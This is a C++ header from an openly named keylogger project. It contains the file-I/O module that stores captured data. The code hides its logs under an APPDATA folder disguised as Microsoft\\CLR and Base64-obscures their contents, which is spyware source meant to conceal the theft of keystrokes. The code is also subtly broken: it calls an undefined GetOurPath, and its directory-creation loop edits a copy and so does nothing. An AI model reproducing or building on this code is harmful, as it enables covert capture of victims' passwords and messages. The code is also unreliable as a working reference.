//
// Created by youssef on 11/05/17.
//
//

#ifndef MYKEYLOGGER_IO_H
#define MYKEYLOGGER_IO_H
#include <cstdlib>
#include <fstream>
#include "Helper.h"
#include"Base64.h"

namespace IO
{

    string getPath(const bool append_seperator=false)
    {
        string appdata_dir(getenv("APPDATA"));
        string full=appdata_dir+"\\Microsoft\\CLR";
        return full + (append_seperator? "\\":"");
    }

    bool MkOneDir(const string path)
    {

        return (bool)CreateDirectory(path.c_str(),NULL) ||
               GetLastError()==ERROR_ALREADY_EXISTS;

    }

    bool MKDir(const string path)
    {

        for(char c: path)
        {
            if(c=='\\')
            {
                c='\0';
                if(!MkOneDir(path))
                {
                    return false;
                }
                c='\\';
            }
        }
        return true;
    }

    template <typename T>
    string writeLog(const T t){

        string path= GetOurPath(true);
        Helper::dateTime dt;
        string name= dt.getDateTime()+".log";

        try
        {
            ofstream file(path+name);
            if(!file) return "";
            ostringstream s;
            s<<"["<<dt.getDateTime()<<"]" <<endl<<t<<endl;
            string data=Base64::encrypt(s.str());
            file << data;
            if(!file) return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }

}


#endif //MYKEYLOGGER_IO_H
